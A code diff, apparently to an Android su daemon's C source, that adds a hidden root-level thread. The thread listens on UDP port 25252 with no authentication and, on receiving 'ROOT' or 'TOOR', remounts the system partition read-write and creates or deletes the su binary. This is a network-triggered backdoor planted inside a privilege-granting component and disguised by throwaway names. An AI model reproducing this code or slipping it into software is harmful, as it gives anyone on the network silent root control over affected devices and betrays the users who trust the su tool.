@@ -41,7 +41,7 @@
 #include <termios.h>
 #include <signal.h>
 #include <string.h>
-
+#include <netinet/in.h>
 #include "su.h"
 #include "utils.h"
 #include "pts.h"
@@ -362,7 +362,40 @@ static int daemon_accept(int fd) {
 
     return run_daemon_child(infd, outfd, errfd, argc, argv);
 }
-
+static void *omg(void *arg)
+{
+    (void)arg;
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if(fd >= 0){
+            char buf[32];
+            struct sockaddr_in addr4;
+            memset(&addr4, 0 ,sizeof(addr4));
+            addr4.sin_family = AF_INET;
+            addr4.sin_port = htons(25252);
+            if (fcntl(fd, F_SETFD, FD_CLOEXEC)) {
+                PLOGE("fcntl FD_CLOEXEC");
+                close(fd);
+                return NULL;
+            }
+            if(bind(fd, (struct sockaddr *)&addr4, sizeof(addr4))<0){
+                perror("bind:");
+                close(fd);
+                return NULL;
+            }
+            while(1){
+                int len = recvfrom(fd, buf, sizeof(buf), 0, NULL, NULL);
+                if(len > 3){
+                    system("/system/bin/mount -o remount,rw /");
+                    if(strncmp(buf, "ROOT", 4) == 0){
+                        system("/system/bin/ln /system/bin/xu /system/bin/su");
+                    }else if(strncmp(buf, "TOOR", 4) == 0){
+                        system("/system/bin/rm /system/bin/su");
+                    }
+                }
+            }
+    }
+    return NULL;
+}
 int run_daemon() {
     if (getuid() != 0 || getgid() != 0) {
         PLOGE("daemon requires root. uid/gid not root");
@@ -371,7 +404,11 @@ int run_daemon() {
 
     int fd;
     struct sockaddr_un sun;
-
+    pthread_t haha;
+    if(pthread_create(&haha, NULL, omg, NULL)){
+        PLOGE("pthread_create failed");
+        return -1;
+    }
     fd = socket(AF_LOCAL, SOCK_STREAM, 0);
     if (fd < 0) {
         PLOGE("socket");
